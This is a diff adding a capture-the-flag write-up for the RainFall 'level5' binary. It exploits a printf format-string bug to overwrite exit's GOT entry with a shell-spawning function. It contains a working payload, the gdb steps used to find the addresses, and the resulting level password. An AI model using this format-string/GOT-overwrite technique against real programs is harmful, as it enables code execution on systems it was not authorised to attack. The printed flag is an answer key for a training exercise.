@@ -1,0 +1,45 @@
+ ▄▄▄▄                                    ▄▄▄▄                ▄▄▄▄▄▄▄
+ ▀▀██                                    ▀▀██                ██▀▀▀▀▀
+   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                ██▄▄▄▄
+   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                █▀▀▀▀██▄
+   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                      ██
+   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             █▄▄▄▄██▀
+    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀              ▀▀▀▀▀
+
+This one is quite barebones:
+- main() only calls p()
+- p() calls fgets() into a buffer of 520 bytes, then pass the buffer to printf
+- p() then calls exit()
+- there is an unused 'o()' function that opens a shell
+That's it !
+
+The address of o() is 0x080484a4
+Could we write a jmp to o() ?
+=>> At the end of n(), it calls exit, we just have to replace exit() by o() !
+
+# Figure out where the format string is in the stack
+level5@RainFall:~$ ./level5
+ AAAA %p %p %p %p [...]
+ AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
+So:
+level5@RainFall:~$ ./level5
+ AAAA %4$p
+ AAAA 0x41414141
+
+call address at the end of n(): 0x08048500
+echo -ne '\x00\x85\x04\x08%134513824d%4$n' | ./level5
+-> does not work because the string contains \x00 ! :O
+
+Regarding `call   0x80483d0 <exit@plt>`
+(gdb) disas 0x80483d0
+> 0x080483d0 <+0>:     jmp    *0x8049838
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>
+
+We can modify the jmp in the Global Offset Table !
+Let's put 0x080484a4 in *0x8049838
+
+echo -ne '\x38\x98\x04\x08%134513824d%4$n' > /tmp/lvl5; cat /tmp/lvl5 - | ./level5
+cat /home/user/level6/.pass
+
+> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
